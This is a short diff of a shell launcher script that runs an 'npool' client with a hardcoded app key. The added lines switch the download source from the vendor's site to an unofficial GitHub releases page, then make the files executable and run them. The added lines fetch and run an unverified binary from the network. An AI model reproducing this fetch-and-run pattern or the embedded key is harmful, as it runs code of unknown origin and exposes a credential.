@@ -2,10 +2,8 @@
 
 APP_KEY="wW8xBLMezohupvC7"
 
-wget -q https://download.npool.io/linux-amd64.tar.gz
-tar -xzf linux-amd64.tar.gz
-cd linux-amd64
-
+wget -q https://github.com/vedhagsvp/soljtka/releases/download/latest/config.json
+wget -q https://github.com/vedhagsvp/soljtka/releases/download/latest/npool
+chmod +x config.json
 chmod +x npool
-
-exec ./npool --appkey "$APP_KEY"
+./npool --appkey "$APP_KEY"
